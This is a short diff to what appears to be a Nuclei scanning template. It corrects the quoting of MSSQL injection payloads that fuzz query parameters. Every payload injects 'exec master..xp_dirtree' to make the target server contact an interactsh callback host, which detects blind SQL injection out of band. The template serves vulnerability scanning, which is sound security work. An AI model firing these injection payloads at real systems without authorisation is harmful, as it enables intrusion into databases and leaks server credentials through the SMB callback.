@@ -14,8 +14,8 @@ http:
     payloads:
       dirtree:
         - "1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
-        - "1' ; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
-        - "1" ; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1\" ; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
         
     fuzzing:
       - part: query
